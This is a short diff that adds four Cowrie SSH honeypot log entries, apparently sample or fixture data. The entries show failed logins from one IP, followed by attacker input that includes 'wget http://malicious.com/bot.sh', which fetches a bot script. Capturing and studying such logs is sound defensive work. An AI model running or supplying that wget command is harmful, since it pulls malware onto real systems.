@@ -1,0 +1,4 @@
+{"eventid":"cowrie.login.failed","src_ip":"185.22.91.10","session":"abc123"}
+{"eventid":"cowrie.login.failed","src_ip":"185.22.91.10","session":"abc123"}
+{"eventid":"cowrie.command.input","src_ip":"185.22.91.10","session":"abc123","input":"uname -a"}
+{"eventid":"cowrie.command.input","src_ip":"185.22.91.10","session":"abc123","input":"wget http://malicious.com/bot.sh"}
